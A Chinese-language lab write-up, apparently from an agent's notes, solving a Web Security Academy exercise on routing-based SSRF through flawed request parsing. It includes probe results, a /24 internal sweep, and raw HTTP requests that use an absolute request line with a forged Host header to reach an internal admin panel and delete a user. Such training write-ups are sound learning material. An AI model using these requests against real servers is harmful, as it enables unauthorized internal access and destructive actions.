---
title: lab-host-header-ssrf-via-flawed-request-parsing
---

# lab-host-header-ssrf-via-flawed-request-parsing

> evidences: [[host-header-family]]

- 题面:routing-based SSRF via flawed request parsing;访问 `192.168.0.0/24` 内网 admin,删 carlos。
- 实例(批46):https://0a5c0058031320b480dabc5b00890097.web-security-academy.net
- 状态:**solved**(横幅 `<h4>Congratulations, you solved the lab!</h4>`,`banner_verdict.solved=true`)

## 解法(成文形状 + 一个缺失件)

批42R 把成文形状(绝对请求行 + `Host: <内网 IP>`)判成"本 infra 全 403",**缺的是 `_lab` 实例 cookie**。批46 实测的层界:

| 请求行 | Host | Cookie | 结果 |
| --- | --- | --- | --- |
| `GET / ` | `<lab>` | session | 200(基线) |
| `GET https://<lab>/` | `<lab>` | session | 200(同 digest) |
| `GET / ` | `192.168.0.171` | session | **403(边缘,无 `_lab` 下发)** |
| `GET https://<lab>/` | `192.168.0.171` | session | **403(边缘)** |
| `GET https://<lab>/` | `192.168.0.171` | **`_lab` + session** | **504 `connecting to 192.168.0.171`(已路由!)** |
| `GET https://192.168.0.171/` | `<lab>` | session | 403 **带 `_lab`**(lab 前端自己的请求行 allowlist) |

⇒ 边缘那条 403 只是"Host 头必须是实例主机",带合法 `_lab` 即放行;之后 lab 前端才按请求行做 allowlist、按 Host 头做路由(即题面漏洞)。**成文形状成立,但必须带 `_lab`**(浏览器会话天然带着,批42R 的裸件扫没有任何 cookie)。

## 收口链

1. `abs_sweep`(新件,绝对请求行 + `Host: 192.168.0.<id>` + `_lab` 扫 /24):254 个里 **192.168.0.170 唯一非 504**(302),其余 251 个 504、2 个写错误。
2. `GET https://<lab>/admin` + `Host: 192.168.0.170` → 200 内网 admin 面板(3040B),含 `POST /admin/delete` + 隐藏 `csrf`。
3. `POST https://<lab>/admin/delete` + `Host: 192.168.0.170` + `csrf=<面板里的值>` + `username=carlos` → **302 `Location: /`** ⇒ 翻牌。

## 证据摘录

```
abs_sweep: {"status_counts":{"504":251,"302":1,"err":2},"outliers":[{"id":170,"status":302,"bytes":0}]}
POST /admin/delete → HTTP/1.1 302 Found / Location: /
banner_verdict → {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
range_launch launch FDA35864…1C7D772 --jar ~/.pi-rs/agent/chrome-jar.json
http_session get "https://<inst>/" --jar <jar> --no-body            # 取 _lab/session
abs_sweep "https://<inst>/" --net 192.168.0 --ids 1-254 --threads 24 --marker carlos \
  --cookie '_lab=<...>; session=<...>' --snippet 200 --timeout-ms 6000
conn_reuse "https://<inst>/" --send-str 'GET https://<inst>/admin HTTP/1.1\r\nHost: 192.168.0.170\r\nCookie: _lab=<...>\r\nConnection: close\r\n\r\n' --out /tmp/admin.txt
conn_reuse "https://<inst>/" --send-str 'POST https://<inst>/admin/delete HTTP/1.1\r\nHost: 192.168.0.170\r\nCookie: _lab=<...>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\nConnection: close\r\n\r\ncsrf=<token>&username=carlos'
```

## 关系

- 族:[[host-header-family]];边缘 `_lab` 门见 [[academy-edge-lab-cookie-gate]];工具 `abs_sweep`(新件)。
